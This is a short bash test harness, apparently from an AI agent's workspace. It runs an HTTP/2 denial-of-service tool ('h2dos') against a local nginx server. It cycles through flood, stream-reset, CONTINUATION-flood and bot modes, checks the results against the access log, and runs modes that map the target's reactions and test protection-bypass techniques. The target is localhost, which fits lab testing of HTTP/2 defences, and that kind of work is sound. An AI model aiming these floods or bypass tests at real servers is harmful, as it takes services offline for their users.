#!/bin/bash
# Matriks validasi: bandingkan angka h2dos dengan hitungan access log nginx.
L=/tmp/h2t/logs/access.log
N=/home/runner/.local/share/opencode/shell/e6c7f69750a97bbd4a59ad21432d3cafecde1f16/sh_18be92817001lihmW2VielSVeI.out
T=https://127.0.0.1:9444/

for m in flood reset myreset contflood bot; do
  : > $L
  out=$(/tmp/h2dos -target $T -mode $m -dur 4s -conns 4 -batch 32 -streams 100 -v 2>&1)
  sleep 0.5
  line=$(echo "$out" | grep "Selesai")
  err=$(echo "$out" | grep "^error:")
  code=$(echo "$out" | grep -oE "GOAWAY kode [0-9]+ [A-Z_]+" | sort -u | head -2 | tr '\n' ';')
  printf "nginx %-10s req-log=%-8s %s | %s | %s\n" "$m" "$(wc -l < $L)" "$line" "$err" "$code"
done

echo "== fez (peta reaksi target) =="
/tmp/h2dos -target $T -mode fez -conns 2 -dur 6s -fez-n 2 2>&1 | sed -n '/Peta fez/,$p' | head -40

echo "== bypass (uji teknik satu-satu) =="
/tmp/h2dos -target $T -mode bypass -bypass-test 2>&1 | sed -n '/Uji bypass/,/ringkasan/p' | head -30
